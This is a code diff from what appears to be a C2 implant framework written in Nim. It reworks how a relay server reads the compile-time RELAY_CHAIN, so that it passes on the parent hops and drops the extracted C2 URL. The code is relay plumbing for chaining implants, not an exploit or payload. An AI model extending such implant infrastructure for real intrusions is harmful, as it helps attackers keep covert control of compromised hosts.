@@ -71,46 +71,39 @@ proc startRelayServerWithPort*(port: int, implantGuid: string, parentAddr: strin
 # Start HTTP relay server in async mode (compile-time RELAY_PORT)
 proc startRelayServerAsync*(implantGuid: string) {.async.} =
     when RELAY_PORT > 0:
-        # Extract C2 URL from RELAY_CHAIN if available
+        # Extract parent chain from RELAY_CHAIN (everything after the first hop, which is us)
         const RELAY_CHAIN {.strdefine.}: string = ""
-        var c2Url: string = ""
         var parentChain: string = ""
         
         when RELAY_CHAIN != "":
-            parentChain = RELAY_CHAIN
-            when defined debug:
-                echo "[RELAY] 🔗 Compile-time RELAY_CHAIN: " & parentChain
-            
-            # Clean and validate hops (trim whitespace, filter empties)
+            # Clean and validate hops
             var cleanHops: seq[string] = @[]
-            for hop in parentChain.split(","):
+            for hop in RELAY_CHAIN.split(","):
                 let trimmedHop = hop.strip()
                 if trimmedHop.len > 0:
                     cleanHops.add(trimmedHop)
             
-            if cleanHops.len > 0:
-                let c2Hop = cleanHops[cleanHops.len - 1]
-                
-                # Check if hop already has protocol
-                if c2Hop.startsWith("http://") or c2Hop.startsWith("https://"):
-                    c2Url = c2Hop
-                else:
-                    # Default to http for compile-time relay
-                    c2Url = "http://" & c2Hop
+            # Parent chain is everything AFTER the first hop (which should be us)
+            if cleanHops.len > 1:
+                # Skip the first hop (ourselves) and join the rest
+                var restOfChain: seq[string] = @[]
+                for i in 1..<cleanHops.len:
+                    restOfChain.add(cleanHops[i])
+                parentChain = restOfChain.join(",")
                 
                 when defined debug:
-                    echo "[RELAY] 🎯 Extracted C2 URL from RELAY_CHAIN: " & c2Url
-            
+                    echo "[RELAY] 🔗 Compile-time RELAY_CHAIN: " & RELAY_CHAIN
+                    echo "[RELAY] 🔗 Parent chain (after us): " & parentChain
+            else:
+                when defined debug:
+                    echo "[RELAY] ⚠️  RELAY_CHAIN only has one hop (us), no parent chain"
+        
         when defined debug:
             echo "[RELAY] 🚀 Starting compile-time relay server on port " & $RELAY_PORT
             echo "[RELAY] 🆔 Using implant GUID: " & implantGuid
-            if c2Url != "":
-                echo "[RELAY] 🎯 C2 URL: " & c2Url
-            if parentChain != "":
-                echo "[RELAY] 🔗 Parent chain: " & parentChain
         
-        # Use compile-time RELAY_PORT with extracted C2 URL
-        discard startRelayServerWithPort(RELAY_PORT, implantGuid, parentChain, c2Url)
+        # Start relay server with parent chain, no C2 URL needed for relay client
+        discard startRelayServerWithPort(RELAY_PORT, implantGuid, parentChain, "")
     else:
         when defined debug:
             echo "[RELAY] ℹ️  No relay server configured (RELAY_PORT not defined)"
